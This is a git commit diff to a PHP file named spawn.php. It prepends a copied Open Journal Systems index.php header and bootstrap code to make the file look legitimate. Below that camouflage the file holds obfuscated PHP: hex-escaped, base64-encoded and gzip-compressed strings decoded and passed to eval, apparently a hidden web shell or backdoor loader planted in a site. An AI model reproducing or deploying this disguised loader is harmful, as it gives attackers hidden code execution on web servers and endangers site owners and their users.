61ebddb979b04318e1e0a0c6787792b6a64814d0
PsychoXploitGit <dapidalexander@gmail.com>
2025-07-30 12:24:51 +0700

    Update spawn.php

--- spawn.php
+++ spawn.php
@@ -1,4 +1,70 @@
 <?php
+
+/**
+ * @mainpage OJS API Reference
+ *
+ * Welcome to the OJS API Reference. This resource contains documentation
+ * generated automatically from the OJS source code.
+ *
+ * The design of Open %Journal Systems 2.x is heavily structured for
+ * maintainability, flexibility and robustness. For this reason it may seem
+ * complex when first approached. Those familiar with Sun's Enterprise Java
+ * Beans technology or the Model-View-Controller (MVC) pattern will note many
+ * similarities.
+ *
+ * As in a MVC structure, data storage and representation, user interface
+ * presentation, and control are separated into different layers. The major
+ * categories, roughly ordered from "front-end" to "back-end," follow:
+ * - Smarty templates, which are responsible for assembling HTML pages to
+ *   display to users;
+ * - Page classes, which receive requests from users' web browsers, delegate
+ *   any required processing to various other classes, and call up the
+ *   appropriate Smarty template to generate a response;
+ * - Action classes, which are used by the Page classes to perform non-trivial
+ *   processing of user requests;
+ * - Model classes, which implement PHP objects representing the system's
+ *   various entities, such as Users, Articles, and Journals;
+ * - Data Access Objects (DAOs), which generally provide (amongst others)
+ *   update, create, and delete functions for their associated Model classes,
+ *   are responsible for all database interaction;
+ * - Support classes, which provide core functionalities, miscellaneous common
+ *
+ * As the system makes use of inheritance and has consistent class naming
+ * conventions, it is generally easy to tell what category a particular class
+ * falls into.
+ * For example, a Data Access Object class always inherits from the DAO class,
+ * has a Class name of the form [Something]%DAO, and has a filename of the form
+ * [Something]%DAO.inc.php.
+ *
+ * To learn more about developing OJS, there are several additional resources
+ * that may be useful:
+ * - The docs/README document
+ * - The PKP support forum at http://forum.pkp.sfu.ca
+ * - The technical reference (and other documents), available at
+ *   http://pkp.sfu.ca/ojs_documentation
+ *
+ * @file index.php
+ *
+ * Copyright (c) 2013-2019 Simon Fraser University
+ * Copyright (c) 2003-2019 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
+ */
+
+// Initialize global environment
+define('INDEX_FILE_LOCATION', __FILE__);
+require('./lib/pkp/includes/bootstrap.inc.php');
+
+// Serve the request
+$application =& PKPApplication::getApplication();
+$application->execute();
+
+?>
+<?php
 $Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
 $Lix = "\x3d\x3d\x41Vgh\x2bZ2mlZX4pUkLD5K5LvDkfVynGLS/\x411nHPLl/9mpER1di4mf\x43OK6\x43jN3D\x43QO\x626gdt1juEhHxnh\x42qK/DnuJOH9y\x43pr3Q\x615L0E3nFOD9\x42zq\x43I8QG0kE4SGn8MQhzmMd\x43qT/w\x62O2uxzd8UW4Fu4Pq\x62yQ\x43VdKmdl\x63vRt5VtFo0x9D/\x627DHdm69ntNR\x61jLR\x43OhUSqQnOmIO4DS\x62vZnuYk\x43\x43y3F8dGS\x42M\x43rwuO20/k\x42wm\x42wJe/nF\x41mGw/U\x42wq\x42wJe/nE\x412Gw/E\x42wu\x42wJe/nD\x41GHw/0\x41wy\x42wJe";
 eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
